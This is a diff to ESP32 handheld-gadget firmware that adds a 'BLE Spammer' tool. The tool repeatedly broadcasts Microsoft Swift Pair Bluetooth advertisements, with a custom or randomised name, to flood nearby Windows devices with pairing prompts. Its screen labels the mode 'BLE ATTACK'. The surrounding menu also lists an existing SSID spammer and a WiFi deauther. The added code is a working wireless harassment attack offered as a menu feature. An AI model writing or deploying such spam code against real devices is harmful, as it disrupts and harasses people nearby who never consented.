@@ -12,6 +12,9 @@
 #include <esp_sntp.h>
 #include <esp_wifi.h>
 #include <Fonts/Org_01.h>
+#include <BLEDevice.h>
+#include <BLEUtils.h>
+#include <BLEServer.h>
 #include "secrets.h"
 
 // NeoPixel LED settings
@@ -68,6 +71,8 @@ enum AppState {
   STATE_TOOL_DETECTOR,
   STATE_DEAUTH_SELECT,
   STATE_TOOL_DEAUTH,
+  STATE_TOOL_BLE_MENU,
+  STATE_TOOL_BLE_RUN,
   STATE_PIN_LOCK,
   STATE_CHANGE_PIN,
   STATE_SCREEN_SAVER,
@@ -149,7 +154,8 @@ KeyboardMode currentKeyboardMode = MODE_LOWER;
 
 enum KeyboardContext {
   CONTEXT_CHAT,
-  CONTEXT_WIFI_PASSWORD
+  CONTEXT_WIFI_PASSWORD,
+  CONTEXT_BLE_NAME
 };
 KeyboardContext keyboardContext = CONTEXT_CHAT;
 
@@ -1008,6 +1014,10 @@ const unsigned char ICON_SYS_TOOLS[] PROGMEM = {
   0x18, 0x3C, 0x7E, 0xFF, 0x5A, 0x24, 0x18, 0x00
 };
 
+const unsigned char ICON_BLE[] PROGMEM = {
+  0x18, 0x5A, 0xDB, 0x5A, 0x18, 0x18, 0x18, 0x18
+};
+
 // Racing Car Sprites (16x16)
 const unsigned char BITMAP_CAR_STRAIGHT[] PROGMEM = {
   0x03, 0xC0, 0x0F, 0xF0, 0x1F, 0xF8, 0x3F, 0xFC,
@@ -1377,6 +1387,139 @@ void drawDetector() {
   display.display();
 }
 
+// --- BLE SPAMMER LOGIC ---
+String bleTargetName = "SwiftPair_Dev";
+bool bleSpamRandomMode = false;
+BLEAdvertising *pAdvertising = NULL;
+BLEServer *pServer = NULL;
+
+void setupBLE(String name) {
+  // Check if already initialized to avoid crash
+  // BLEDevice::init is idempotent in recent versions but let's be safe
+  // We can't easily check if initialized, but re-init usually requires deinit
+  // For simplicity, we assume we clean up properly on exit
+
+  BLEDevice::init(name.c_str());
+  pServer = BLEDevice::createServer();
+  pAdvertising = pServer->getAdvertising();
+  pAdvertising->setAppearance(0x03C1); // Keyboard
+}
+
+void updateBLESpam() {
+  // Simple burst logic: stop, update name, start, delay
+
+  String currentName = bleTargetName;
+  if (bleSpamRandomMode) {
+      currentName = generateRandomSSID(); // Reuse SSID spammer names
+  }
+
+  // Swift Pair Payload
+  char swiftPairPayload[] = {
+      0x06, 0x00, // Microsoft Vendor ID
+      0x03,       // Microsoft Beacon ID
+      0x00,       // Scenario Type
+      0x80,       // Device Type
+      0x00, 0x00, 0x00 // Reserved
+  };
+
+  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
+  oAdvertisementData.setFlags(0x04);
+  oAdvertisementData.setManufacturerData(std::string(swiftPairPayload, 7));
+  oAdvertisementData.setName(currentName.c_str());
+
+  // Note: BLEDevice::init(name) sets the local device name.
+  // oAdvertisementData.setName sets the name in the advertising packet.
+
+  if (pAdvertising) {
+      pAdvertising->stop();
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->start();
+  } else {
+      // First run initialization
+      setupBLE(currentName);
+      pAdvertising->setAdvertisementData(oAdvertisementData);
+      pAdvertising->start();
+  }
+
+  // Throttle to prevent crash or too fast
+  delay(200);
+}
+
+void stopBLESpam() {
+  if (pAdvertising) {
+      pAdvertising->stop();
+  }
+  // Cleaning up BLE completely is tricky on Arduino ESP32 without reboot
+  // We will just stop advertising.
+  // Ideally: BLEDevice::deinit(true); if supported
+}
+
+void drawBLEMenu(int x_offset) {
+  const char* items[] = {
+    "Set Name",
+    "Start Static",
+    "Start Random",
+    "Back"
+  };
+  static float bleScrollY = 0;
+  drawGenericListMenu(x_offset, "BLE SPAMMER", ICON_BLE, items, 4, menuSelection, &bleScrollY);
+}
+
+void handleBLEMenuSelect() {
+  switch(menuSelection) {
+    case 0: // Set Name
+      userInput = bleTargetName;
+      keyboardContext = CONTEXT_BLE_NAME;
+      cursorX = 0;
+      cursorY = 0;
+      changeState(STATE_KEYBOARD);
+      break;
+    case 1: // Start Static
+      bleSpamRandomMode = false;
+      changeState(STATE_TOOL_BLE_RUN);
+      break;
+    case 2: // Start Random
+      bleSpamRandomMode = true;
+      changeState(STATE_TOOL_BLE_RUN);
+      break;
+    case 3: // Back
+      changeState(STATE_SYSTEM_SUB_TOOLS);
+      break;
+  }
+}
+
+void drawBLERun() {
+  display.clearDisplay();
+
+  // Hacker animation effect
+  if (random(0, 10) == 0) display.invertDisplay(true);
+  else display.invertDisplay(false);
+
+  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
+  display.setTextColor(SSD1306_BLACK);
+  display.setTextSize(1);
+  display.setCursor(30, 2);
+  display.print("BLE ATTACK");
+
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(0, 20);
+  display.print("Mode: ");
+  display.print(bleSpamRandomMode ? "RANDOM" : "STATIC");
+
+  display.setCursor(0, 35);
+  display.print("Name: ");
+  if (bleSpamRandomMode) {
+      display.print(generateRandomSSID().substring(0, 10) + "..");
+  } else {
+      display.print(bleTargetName.substring(0, 12));
+  }
+
+  display.setCursor(0, 50);
+  display.print("Status: BROADCASTING");
+
+  display.display();
+}
+
 void stopWifiTools() {
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -1458,6 +1601,8 @@ void refreshCurrentScreen() {
     case STATE_TOOL_DETECTOR: drawDetector(); break;
     case STATE_DEAUTH_SELECT: drawDeauthSelect(x_offset); break;
     case STATE_TOOL_DEAUTH: drawDeauthTool(); break;
+    case STATE_TOOL_BLE_MENU: drawBLEMenu(x_offset); break;
+    case STATE_TOOL_BLE_RUN: drawBLERun(); break;
     // Game states handle their own drawing, so no call here
     case STATE_GAME_SPACE_INVADERS:
     case STATE_GAME_SIDE_SCROLLER:
@@ -1841,6 +1986,7 @@ void loop() {
 
   if (currentState == STATE_TOOL_SPAMMER) updateSpammer();
   if (currentState == STATE_TOOL_DETECTOR) updateDetector();
+  if (currentState == STATE_TOOL_BLE_RUN) updateBLESpam();
 
   if (currentState == STATE_VIDEO_PLAYER) {
     drawVideoPlayer();
@@ -4045,10 +4191,11 @@ void showSystemToolsMenu(int x_offset) {
     "SSID Spammer",
     "Deauth Detect",
     "WiFi Deauther",
+    "BLE Spammer",
     "Reboot System",
     "Back"
   };
-  drawGenericListMenu(x_offset, "TOOLS", ICON_SYS_TOOLS, items, 7, systemMenuSelection, &systemMenuScrollY);
+  drawGenericListMenu(x_offset, "TOOLS", ICON_SYS_TOOLS, items, 8, systemMenuSelection, &systemMenuScrollY);
 }
 
 void handleSystemMenuSelect() {
@@ -4119,6 +4266,10 @@ void handleSystemToolsMenuSelect() {
       scanForDeauth();
       break;
     case 5:
+      menuSelection = 0;
+      changeState(STATE_TOOL_BLE_MENU);
+      break;
+    case 6:
       display.clearDisplay();
       display.setCursor(30, 30);
       display.print("Rebooting...");
@@ -4126,7 +4277,7 @@ void handleSystemToolsMenuSelect() {
       delay(500);
       ESP.restart();
       break;
-    case 6: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 2; break;
+    case 7: changeState(STATE_SYSTEM_MENU); systemMenuSelection = 2; break;
   }
 }
 
@@ -4566,6 +4717,9 @@ void handleKeyPress() {
   if (strcmp(key, "OK") == 0) {
     if (keyboardContext == CONTEXT_CHAT) {
       sendToGemini();
+    } else if (keyboardContext == CONTEXT_BLE_NAME) {
+      bleTargetName = userInput;
+      changeState(STATE_TOOL_BLE_MENU);
     }
   } else if (strcmp(key, "<") == 0) {
     if (userInput.length() > 0) {
@@ -4655,6 +4809,9 @@ void handleUp() {
           wifiPage--;
         }
       }
+      break;
+    case STATE_TOOL_BLE_MENU:
+      if (menuSelection > 0) menuSelection--;
       break;
     case STATE_API_SELECT:
       if (menuSelection > 0) {
@@ -4747,6 +4904,9 @@ void handleDown() {
           wifiPage++;
         }
       }
+      break;
+    case STATE_TOOL_BLE_MENU:
+      if (menuSelection < 3) menuSelection++;
       break;
     case STATE_API_SELECT:
       if (menuSelection < 1) {
@@ -4899,6 +5059,9 @@ void handleSelect() {
           showStatus("Saved!", 1000);
           changeState(STATE_SYSTEM_MENU);
       }
+      break;
+    case STATE_TOOL_BLE_MENU:
+      handleBLEMenuSelect();
       break;
     case STATE_API_SELECT:
       handleAPISelectSelect();
@@ -5068,6 +5231,14 @@ void handleBackButton() {
     case STATE_TOOL_DEAUTH:
       stop_deauth();
       changeState(STATE_DEAUTH_SELECT);
+      break;
+    case STATE_TOOL_BLE_MENU:
+      changeState(STATE_SYSTEM_SUB_TOOLS);
+      break;
+    case STATE_TOOL_BLE_RUN:
+      stopBLESpam();
+      display.invertDisplay(false);
+      changeState(STATE_TOOL_BLE_MENU);
       break;
 
     default:
